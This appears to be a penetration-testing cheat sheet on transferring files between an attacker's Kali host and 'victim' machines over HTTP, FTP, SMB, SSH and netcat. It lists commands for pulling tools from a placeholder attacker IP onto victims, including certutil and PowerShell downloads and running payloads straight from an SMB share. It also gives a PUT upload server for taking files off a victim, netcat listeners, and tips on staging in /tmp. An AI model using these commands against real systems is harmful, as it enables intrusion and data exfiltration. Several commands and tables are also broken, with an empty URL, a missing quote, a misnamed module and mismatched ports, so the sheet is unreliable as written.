

# Transfering files
## HTTP

| Sending Linux    | Receiving Linux | Receiving Windows |
| -------- | ------- | ------- |
| python3 -m http.server 8080  | wget http://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>) <br> curl http://<kali_IP>:<Port_number>/<file> (-o /path/to/dir/<file>) | certutil -urlcache -split -f "" [output-file] <br> powershell -c (new-object System.Net.WebClient).DownloadFile('http://<kali_IP>:<Port_number>/<file>,'C:\path\to\<file>') <br> to instantly execute it: ...|



Sending to Linux:

https://gist.github.com/fabiand/5628006
SimpleHTTPPutServer.py

# python3 -m SimpleHTTPPutServer 8080

from http.server import HTTPServer, SimpleHTTPRequestHandler

class PutHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        print(self.headers)
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=PutHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()


curl -T <file> http://<kali_IP>:<Port_number>

## FTP
Kali -> Victim

| Kali    | Linux Victim | Windows Victim cmd.exe |
| -------- | ------- |
| python3 -m http.server 8080  | wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>) | ...|
| python3 -m pytfplib -w -p <Port_number>

## SMB

Kali -> Victim

| Kali    | Windows Victim PowerShell |
| -------- | ------- |
| impacket-smbserver <server_name> .  | to instantly execute it: powershell -c (\\<kali_IP\<server_name>\<payload) |

impacket-smbserver <server_name> .

## SSH
| Sending    | Receiving |
| ------- | ------- |
| scp <file_name> <remote_username>@<remote_IP>:/path/to/dir | scp <remote_username>@(remote_IP):/path/to/<file_name> /path/to/local_dir |

## NetCat

| Sending | Receiving |
| -------- | ------- |
| nc -w 3 [destination] <Port_number> < <file_name> | nc -l -p <Port_number> > <file_name> |
| | nc -lvnp <Port_number> |



Useful notes:
- on Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable
- upgrade your shell, if possible
- try multiple methods
